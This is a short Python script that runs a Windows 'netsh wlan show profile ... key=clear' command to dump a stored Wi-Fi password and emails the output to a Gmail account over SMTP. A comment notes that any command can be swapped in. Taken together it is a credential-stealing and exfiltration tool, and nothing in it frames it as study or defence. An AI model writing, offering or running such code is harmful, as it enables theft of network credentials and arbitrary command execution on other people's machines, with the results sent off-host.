import smtplib
import subprocess

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile salman key=clear" # here you can set what ever comand you want to run
result = subprocess.check_output(command, shell=True)
send_mail("email", "password", result)
